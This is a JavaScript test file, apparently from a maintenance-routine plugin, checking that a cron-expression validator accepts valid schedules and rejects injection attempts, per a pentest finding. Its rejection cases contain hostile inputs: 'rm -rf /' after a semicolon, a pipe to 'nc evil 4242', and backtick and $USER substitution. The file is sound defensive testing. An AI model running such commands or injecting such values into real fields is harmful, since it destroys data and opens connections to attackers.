import test from 'ava';

import { isValidCronGrammar } from '../../plugins/manut/manut-routine.service';

// The validator is intentionally grammar-only — it does not parse or
// evaluate. PR 1's job is to keep shell metacharacters and free-form
// text out of the `cron_schedule` column so a future PR-2 cron evaluator
// can't be fed an expression that triggers regex backtracking or shell
// injection. Per pentest M4.

test('accepts standard 5-field cron', t => {
  t.true(isValidCronGrammar('0 9 * * 1'));
});

test('accepts standard 6-field cron with seconds', t => {
  t.true(isValidCronGrammar('0 0 9 * * 1'));
});

test('accepts step values', t => {
  t.true(isValidCronGrammar('*/5 * * * *'));
});

test('accepts comma ranges and dashes', t => {
  t.true(isValidCronGrammar('0 9,17 * * 1-5'));
});

test('accepts L W # extension chars (Quartz-style)', t => {
  t.true(isValidCronGrammar('0 0 L * * ?'));
  t.true(isValidCronGrammar('0 0 ? * 2#1'));
});

test('rejects empty string', t => {
  t.false(isValidCronGrammar(''));
});

test('rejects strings shorter than 3 chars', t => {
  t.false(isValidCronGrammar('* '));
});

test('rejects shell metacharacters — semicolon', t => {
  t.false(isValidCronGrammar('0 9 * * 1; rm -rf /'));
});

test('rejects shell metacharacters — pipe', t => {
  t.false(isValidCronGrammar('0 9 * * 1 | nc evil 4242'));
});

test('rejects shell metacharacters — backtick', t => {
  t.false(isValidCronGrammar('0 9 * * `whoami`'));
});

test('rejects shell metacharacters — dollar', t => {
  t.false(isValidCronGrammar('0 9 * * $USER'));
});

test('rejects letters / free-form English', t => {
  t.false(isValidCronGrammar('every Monday at 9am'));
});

test('rejects very long input (> 120 chars)', t => {
  const longExpr = '* '.repeat(70);
  t.false(isValidCronGrammar(longExpr));
});

test('rejects null bytes', t => {
  t.false(isValidCronGrammar('0 9 * * 1\x00'));
});

test('rejects newlines (could break log parsing)', t => {
  t.false(isValidCronGrammar('0 9 * * 1\n0 17 * * 1'));
});
